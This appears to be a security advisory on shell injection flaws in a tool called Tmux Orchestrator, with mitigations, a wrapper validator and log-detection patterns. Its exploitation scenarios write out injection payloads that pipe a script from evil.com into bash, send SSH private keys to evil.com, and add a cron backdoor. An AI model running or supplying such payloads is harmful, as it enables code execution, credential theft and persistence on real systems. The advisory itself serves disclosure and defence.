# Security Advisory: Critical Shell Injection Vulnerabilities

**Advisory ID**: TMUX-ORC-2025-08-001
**Date**: August 16, 2025
**Severity**: CRITICAL (CVSS 9.8)
**Affected Versions**: All versions up to and including 2.1.24
**Fixed Version**: TBD (patch in development)

## Executive Summary

Multiple critical shell injection vulnerabilities have been identified in Tmux Orchestrator that allow attackers to execute arbitrary commands on the host system. These vulnerabilities affect core functionality including orchestrator spawning, agent spawning, and team composition features.

**IMMEDIATE ACTION REQUIRED**: Users should apply mitigation steps immediately and update to the patched version once available.

## Vulnerabilities Overview

### 1. Shell Injection in Orchestrator Spawning (CVE-PENDING-001)
- **CVSS Score**: 9.8 (Critical)
- **Component**: `tmux_orchestrator/cli/spawn_orc.py`
- **Attack Vector**: Network/Local
- **Privileges Required**: None
- **User Interaction**: None

### 2. Command Injection in Agent Spawning (CVE-PENDING-002)
- **CVSS Score**: 7.5 (High)
- **Component**: `tmux_orchestrator/cli/spawn.py`
- **Attack Vector**: Local
- **Privileges Required**: Low
- **User Interaction**: None

### 3. Template Injection in Team Composition (CVE-PENDING-003)
- **CVSS Score**: 6.0 (Medium)
- **Component**: `tmux_orchestrator/cli/team_compose.py`
- **Attack Vector**: Local
- **Privileges Required**: Low
- **User Interaction**: Required

## Impact

### System Compromise (Critical)
An attacker can achieve complete system compromise by injecting malicious commands through:
- Profile names
- Terminal parameters
- Agent briefings
- Project names

### Data Exfiltration (High)
Attackers can:
- Access sensitive files (`/etc/passwd`, SSH keys, environment variables)
- Exfiltrate source code and proprietary data
- Access cloud credentials and API keys

### Denial of Service (High)
Malicious inputs can:
- Delete critical system files
- Consume system resources
- Crash the tmux server

## Exploitation Scenarios

### Scenario 1: Remote Code Execution via Orchestrator
```bash
# Attacker executes system commands
tmux-orc spawn orc --profile '; curl evil.com/backdoor.sh | bash #'

# Result: Downloads and executes remote script with full user privileges
```

### Scenario 2: Data Theft via Agent Briefing
```bash
# Attacker exfiltrates sensitive data
tmux-orc spawn agent hacker target:1 \
  --briefing "$(cat ~/.ssh/id_rsa | base64 | curl -X POST evil.com/steal -d @-)"

# Result: Steals SSH private keys and sends to attacker server
```

### Scenario 3: Privilege Escalation
```bash
# Attacker adds malicious cron job
tmux-orc spawn orc --terminal 'xterm; echo "* * * * * /tmp/evil.sh" | crontab -'

# Result: Persistent backdoor with recurring execution
```

## Affected Components

1. **Orchestrator Spawning**
   - Unescaped shell script generation
   - Direct command interpolation
   - No input validation

2. **Agent Management**
   - Unsafe daemon command construction
   - Unvalidated briefing content
   - Path traversal in working directories

3. **Team Templates**
   - Unsafe string replacement
   - No template sanitization
   - HTML/script injection possible

## Mitigation Steps

### Immediate Actions (Required)

1. **Restrict Access**
   ```bash
   # Limit who can run tmux-orc commands
   chmod 750 $(which tmux-orc)
   chown root:tmux-users $(which tmux-orc)
   ```

2. **Input Validation Script**
   Create wrapper script `/usr/local/bin/tmux-orc-safe`:
   ```bash
   #!/bin/bash
   # Validate all arguments before passing to tmux-orc
   for arg in "$@"; do
     if [[ "$arg" =~ [';|&`$(){}[]<>'] ]]; then
       echo "ERROR: Invalid characters in argument: $arg"
       exit 1
     fi
   done
   exec /usr/bin/tmux-orc "$@"
   ```

3. **Monitor for Exploitation**
   ```bash
   # Add to system monitoring
   grep -E "(spawn orc|spawn agent).*[;|&\`$]" /var/log/tmux-orchestrator/*.log
   ```

4. **Temporary Workaround**
   If you cannot update immediately, disable the vulnerable commands:
   ```python
   # Add to tmux_orchestrator/cli/__init__.py
   import sys
   if any(arg in ['spawn', 'team'] for arg in sys.argv):
       print("ERROR: Command temporarily disabled for security update")
       sys.exit(1)
   ```

### Long-term Solutions

1. **Update to Patched Version** (when available)
   ```bash
   pip install --upgrade tmux-orchestrator>=2.1.25
   ```

2. **Enable Security Features**
   ```json
   {
     "security": {
       "enable_input_validation": true,
       "enable_command_sanitization": true,
       "restrict_shell_access": true
     }
   }
   ```

3. **Implement Defense in Depth**
   - Use SELinux/AppArmor profiles
   - Run in containers with limited capabilities
   - Implement network segmentation

## Detection

### Log Analysis
Check for exploitation attempts:
```bash
# Search for suspicious patterns
grep -E "(;|&&|\|\||`|\$\()" /var/log/tmux-orchestrator/*.log
grep -E "(curl|wget|nc|bash|sh|python)" /var/log/tmux-orchestrator/*.log
```

### System Monitoring
Monitor for:
- Unexpected process spawning from tmux
- Outbound network connections from tmux processes
- File system modifications in system directories

## Fixed Version Details

The fix implements:
- `shlex.quote()` for all shell arguments
- Pydantic validation models for input validation
- Regex patterns to restrict input characters
- Safe template rendering with HTML escaping

## Timeline

- **2025-08-14**: Vulnerabilities discovered during security review
- **2025-08-16**: Security advisory published
- **2025-08-17**: Patch release expected (v2.1.25)
- **2025-08-31**: End of support for vulnerable versions

## Credits

- Security Research Team
- Tmux Orchestrator Development Team

## References

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Fix Implementation Guide](./CLI_SECURITY_BLOCKERS.md)

## Contact

For security concerns or questions:
- File a security issue (private): [GitHub Security](https://github.com/tmux-orchestrator/security)
- Email: security@tmux-orchestrator.org

---

**Remember**: Security is a shared responsibility. Always validate inputs, use the latest versions, and follow security best practices.
